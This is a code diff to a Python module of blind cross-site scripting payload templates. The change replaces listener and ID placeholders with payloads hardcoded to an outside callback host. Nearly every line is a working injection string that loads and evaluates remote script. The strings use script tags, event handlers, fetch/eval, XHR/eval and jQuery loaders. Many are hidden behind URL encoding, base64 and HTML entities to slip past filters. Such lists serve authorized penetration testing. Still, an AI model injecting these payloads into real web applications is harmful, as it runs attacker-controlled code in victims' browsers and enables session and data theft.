@@ -1,75 +1,60 @@
-"""
-Blind XSS Payload Templates
-
-All payloads MUST contain {UUID} and {LISTENER} placeholders for correlation and callback.
-Integrated from battle-tested payloads; context-aware for different injection points.
-Callback format: {LISTENER}/c/{UUID}
-"""
+"""Blind XSS payload templates."""
 import random
 import urllib.parse
+import base64
 
 # Script injection payloads (direct script tag loading, most reliable)
 SCRIPT_PAYLOADS = [
-    # Direct script tag with full URL
-    '"><script src={LISTENER}/c/{UUID}></script>',
-    'javascript:eval(\'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a)\')',
-    '<svg onload="javascript:eval(\'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a)\')" />',
-    '<iframe src="javascript:var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)"></iframe>',
-    '<body onload="var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)">',
-    
-    # Protocol-relative loaders (jQuery, XHR, fetch)
-    '<script>$.getScript("//{LISTENER_HOST}/c/{UUID}")</script>',
-    '<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{LISTENER_HOST}/c/{UUID}");a.send();</script>',
-    '<script>fetch("//{LISTENER_HOST}/c/{UUID}").then(r=>r.text()).then(t=>eval(t))</script>',
-    
-    # Inline script variable assignment
-    'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a);',
+    "'\"><script src=https://xss.report/c/srikanthreddy334></script>",
+    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/srikanthreddy334\\';document.body.appendChild(a)')",
+    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/srikanthreddy334");a.send();</script>',
+    'var a=document.createElement("script");a.src="https://xss.report/c/srikanthreddy334";document.body.appendChild(a);',
+    '<script>$.getScript("//xss.report/c/srikanthreddy334")</script>',
+    '<script>fetch("//xss.report/c/srikanthreddy334").then(r=>r.text()).then(t=>eval(t))</script>',
+    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\\xss.report\\c\\srikanthreddy334/.source))//>',
+    '%22%3E%3Cscript%20src=https://xss.report/c/srikanthreddy334%3E%3C/script%3E',
+    'javascript:eval(\'var%20a=document.createElement(%5C\'script%5C\');a.src=%5C\'https://xss.report/c/srikanthreddy334%5C\';document.body.appendChild(a)\')',
+    '%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D;a=new%20XMLHttpRequest();a.addEventListener(%22load%22,%20b);a.open(%22GET%22,%20%22//xss.report/c/srikanthreddy334%22);a.send();%3C/script%3E',
+    'var%20a=document.createElement(%22script%22);a.src=%22https://xss.report/c/srikanthreddy334%22;document.body.appendChild(a);',
+    '%3Cscript%3E$.getScript(%22//xss.report/c/srikanthreddy334%22)%3C/script%3E',
+    '%3Cscript%3Efetch(%22//xss.report/c/srikanthreddy334%22).then(r=%3Er.text()).then(t=%3Eeval(t))%3C/script%3E',
+    'javascript:%22/*\'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:%5Cxss.report%5Cc%5Csrikanthreddy334/.source))//%3E',
 ]
 
 # Event handler payloads (onerror, onfocus, onmouseover, onload)
 EVENT_HANDLER_PAYLOADS = [
-    # Image with base64 id attribute (eval(atob))
-    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsYW5icmFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>',
-    
-    # Input autofocus with base64 id
-    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsYW5icmFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus>',
-    
-    # Video source with onerror
-    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsYW5icmFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==>',
-    
-    # Div with onmouseover
-    '<div onmouseover="var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)">Hover me</div>',
-    
-    # Audio with onerror
-    '<audio src="x" onerror="var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)">',
+    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>',
+    '<svg onload="javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://xss.report/c/srikanthreddy334\\\';document.body.appendChild(a)\')" />',
+    '<div onmouseover="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)">Hover me</div>',
+    '<body onload="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)">',
+    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',
+    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>',
+    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/srikanthreddy334&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
+    '<audio src="x" onerror="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)">',
+    '%22%3E%3Cvideo%3E%3Csource%20onerror=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%3E',
+    '%3Csvg%20onload=%22javascript:eval(\'var%20a=document.createElement(%5C\'script%5C\');a.src=%5C\'https://xss.report/c/srikanthreddy334%5C\';document.body.appendChild(a)\')%22%20/%3E',
+    '%3Cdiv%20onmouseover=%22var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3EHover%20me%3C/div%3E',
+    '%3Cbody%20onload=%22var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3E',
+    '%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20onerror=eval(atob(this.id))%3E',
+    '%22%3E%3Cinput%20onfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20autofocus%3E',
+    '%22%3E%3Ciframe%20srcdoc=%22&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/srikanthreddy334&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;%22%3E',
+    '%3Caudio%20src=%22x%22%20onerror=%22var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3E',
 ]
 
 # Filter bypass payloads (comment chains, import tricks, etc.)
 BYPASS_PAYLOADS = [
-    # JavaScript protocol with comment bypass chain
-    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=(import(/https:\\{LISTENER_HOST}\\c\\{UUID}/.source))//>',
-    
-    # Simple bypass variants
-    '"><svg onload=fetch("{LISTENER}/c/{UUID}") />',
-    '"><iframe srcdoc="<script>fetch(\'{LISTENER}/c/{UUID}\')</script>" />',
+    '<iframe src="javascript:var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)"></iframe>',
+    '%3Ciframe%20src=%22javascript:var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3E%3C/iframe%3E',
 ]
 
 # JSON context payloads (for API endpoint injection)
-JSON_PAYLOADS = [
-    '{{"key":"value","x":"<script src=\'{LISTENER}/c/{UUID}\'></script>"}}',
-    '{{"key":"value","x":"</script><script src=\'{LISTENER}/c/{UUID}\'></script>"}}',
-]
+JSON_PAYLOADS = []
 
 # Header injection payloads (Referer, X-Forwarded-For)
-HEADER_PAYLOADS = [
-    '</script><script src=\'{LISTENER}/c/{UUID}\'></script>',
-    'javascript:eval(\'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a)\')',
-]
+HEADER_PAYLOADS = []
 
 # Cookie/localStorage exfiltration payloads (with data leakage)
-EXFIL_PAYLOADS = [
-    'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a);',
-]
+EXFIL_PAYLOADS = []
 
 
 def get_script_payloads():
@@ -180,7 +165,20 @@ def substitute_placeholders(payload: str, listener_url: str, uuid: str) -> str:
     # Extract host from URL for protocol-relative payloads
     listener_host = listener_url.split('://')[-1] if '://' in listener_url else listener_url
     
-    return payload.replace('{LISTENER}', listener_url).replace('{LISTENER_HOST}', listener_host).replace('{UUID}', uuid)
+    js_loader = (
+        'var a=document.createElement("script");'
+        f'a.src="{listener_url}/c/{uuid}";'
+        'document.body.appendChild(a);'
+    )
+    b64_js = base64.b64encode(js_loader.encode("utf-8")).decode("ascii")
+
+    return (
+        payload
+        .replace('{LISTENER}', listener_url)
+        .replace('{LISTENER_HOST}', listener_host)
+        .replace('{UUID}', uuid)
+        .replace('{B64_JS}', b64_js)
+    )
 
 
 def get_payloads_for_context(context: str, listener_url: str, uuid: str) -> list:
